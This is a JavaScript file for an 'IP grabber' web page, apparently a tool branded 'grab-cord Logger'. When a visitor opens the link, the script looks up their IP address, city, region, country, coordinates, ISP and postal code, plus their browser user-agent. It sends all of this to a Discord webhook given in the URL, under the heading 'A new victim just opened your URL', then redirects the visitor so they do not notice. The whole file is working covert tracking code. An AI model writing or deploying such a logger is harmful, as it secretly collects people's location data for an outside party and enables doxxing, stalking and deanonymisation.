document.addEventListener("DOMContentLoaded", () => {
    const urlParams = new URLSearchParams(window.location.search);
    const webhookURL = urlParams.get("webhook");
    const redirectURL = urlParams.get("redirect");
  
    if (webhookURL) {
      // Fetch IP information from ipinfo.io
      fetch("https://ipinfo.io")
        .then((response) => response.json())
        .then((ipInfo) => {
          // Create the main embed object with IP information
          const main = {
            title: "grab-cord Logger",
            description: "> __A new victim just opened your URL:__",
            thumbnail: {
              url: "https://i1.sndcdn.com/avatars-qoKvbOjOy1aF8Fnl-ZKqvUA-t500x500.jpg",
            },
            fields: [
              {
                name: "IP:",
                value: `\`${ipInfo.ip}\``,
                inline: false,
              },
              {
                name: "User-Agent:",
                value: `\`${navigator.userAgent}\``,
                inline: false,
              },
              {
                name: "Town:",
                value: `\`${ipInfo.city}\``,
                inline: false,
              },
              {
                name: "Region:",
                value: `\`${ipInfo.region}\``,
                inline: false,
              },
              {
                name: "Country:",
                value: `\`${ipInfo.country}\``,
                inline: false,
              },
              {
                name: "Location:",
                value: `\`${ipInfo.loc}\``,
                inline: false,
              },
              {
                name: "Company:",
                value: `\`${ipInfo.org}\``,
                inline: false,
              },
              {
                name: "Postal Code:",
                value: `\`${ipInfo.postal}\``,
                inline: false,
              },
            ],
            footer: {
              text: "roc4et.de",
            },
            author: {
              name: "made by @roc4et",
              url: "https://roc4et.de",
            },
          };
  
          // Send the embed data to Discord
          sendEmbedToDiscord(webhookURL, main, redirectURL);
        })
        .catch((error) => {
          console.error("Error fetching IP information:", error);
        });
    }
  });
  
  function sendEmbedToDiscord(webhookURL, embedData, redirectURL) {
    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ embeds: [embedData] }),
    })
      .then((response) => {
        if (!response.ok) {
          console.error("Failed to send the embed to Discord.");
          return;
        }
  
        console.log("Embed sent successfully!");
  
        // Check if there's a redirectURL and then redirect to it
        if (redirectURL) {
          window.location.href = redirectURL;
        }
      })
      .catch((error) => {
        console.error("Error sending the embed:", error);
      });
  }
  